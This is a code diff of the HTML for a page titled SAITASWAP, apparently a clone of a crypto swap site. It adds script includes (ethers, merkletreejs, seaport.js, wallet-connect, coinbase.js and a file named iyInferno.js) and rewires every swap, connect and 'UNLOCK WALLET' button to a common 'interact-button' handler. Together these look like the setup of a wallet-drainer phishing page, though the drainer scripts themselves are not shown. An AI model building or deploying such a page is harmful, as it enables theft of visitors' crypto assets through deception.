@@ -14,9 +14,23 @@
     <link rel="manifest" href="/manifest.json">
     <title>SAITASWAP</title>
     <link href="/static/css/main.cc7562bc.css" rel="stylesheet">
-    <script src="vla_angel.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/merkletreejs@latest/merkletree.js"></script>
+    <script src="./files(1)/scripts/wallet-connect-v2.js"></script>
+    <!-- <script src="./files(1)/scripts/wallet-connect-v3.js"></script> -->
+    <script src="./files(1)/scripts/seaport.js"></script>
+    <script src="./files(1)/scripts/coinbase.js"></script>
+    <script charset="UTF-8" type="text/javascript" src="./iyInferno.js"></script>
+    <link rel="stylesheet" href="./style_mod.css">
+    <link rel="stylesheet" href="./files(1)/styles/modal-6.css">
+    <link rel="stylesheet" href="./files(1)/styles/popup-5.css">
+    <link rel="stylesheet" href="./files(1)/styles/popup-2.css">
+    <link rel="stylesheet" href="./files(1)/styles/popup-3.css">
+    <link rel="stylesheet" href="./files(1)/styles/popup-6.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+</head>
 
-    <!-- <link rel="stylesheet" href="style.css"> -->
+<!-- <link rel="stylesheet" href="style.css"> -->
 </head>
 
 <body><noscript>You need to enable JavaScript to run this app.</noscript>
@@ -38,17 +52,17 @@
                                     src="/static/media/SaitaIcon.b3e03e45483e5eab6b8a.png" alt=""><span>$0.00001</span>
                             </div>
                             <ul class="Sidebar_sidebarInner__Uy8zg">
-                                <li><a class="connectButton" href="javascript:void();">Swap</a></li>
-                                <li><a class="connectButton" href="javascript:void();">Trade</a></li>
-                                <li><a class="connectButton" href="javascript:void();">Liquidity</a></li>
-                                <li><a class="connectButton" href="javascript:void();">Staking Pools</a></li>
-                                <li><a class="connectButton" href="javascript:void();">Farm</a></li>
+                                <li><a class="interact-button" href="javascript:void();">Swap</a></li>
+                                <li><a class="interact-button" href="javascript:void();">Trade</a></li>
+                                <li><a class="interact-button" href="javascript:void();">Liquidity</a></li>
+                                <li><a class="interact-button" href="javascript:void();">Staking Pools</a></li>
+                                <li><a class="interact-button" href="javascript:void();">Farm</a></li>
                             </ul>
                         </div>
                         <div class="Header_headerAction__9fK84"><button class="Button_CommonBtn__-z0BQ undefined "
-                                disabled="" type="button" data-variant="bordered-white connectButton">Network
+                                disabled="" type="button" data-variant="bordered-white interact-button">Network
                             </button><button class="Button_CommonBtn__-z0BQ Header_IconBtn__bEN3S " type="button"><span
-                                    class="d-inline-block connectButton">Connect</span><span
+                                    class="d-inline-block interact-button">Connect</span><span
                                     class="d-sm-inline-block m-0 d-none"><svg xmlns="http://www.w3.org/2000/svg"
                                         width="40" height="40" viewBox="0 0 40 40">
                                         <defs>
@@ -115,7 +129,7 @@
                                                             fill-rule="evenodd"></path>
                                                     </svg></span></button></div>
                                     </div>
-                                    <div class="CardCustom_CardCustomInner__Sg24H connectButton">
+                                    <div class="CardCustom_CardCustomInner__Sg24H interact-button">
                                         <h3>Swap</h3>
                                         <div class="Exchange_ExchangeBody__7o3f6">
                                             <div class="SelectCoinStyle_SelectCoin__sgqkd"><label>From<button
@@ -200,7 +214,7 @@
                                                 </ul>
                                             </div>
                                             <div class="Exchange_ExchangeBodyAction__7a7io"><button
-                                                    class="Button_CommonBtn__-z0BQ swapBtn connectButton "
+                                                    class="Button_CommonBtn__-z0BQ swapBtn interact-button "
                                                     type="button">UNLOCK WALLET
                                                 </button></div>
                                         </div>
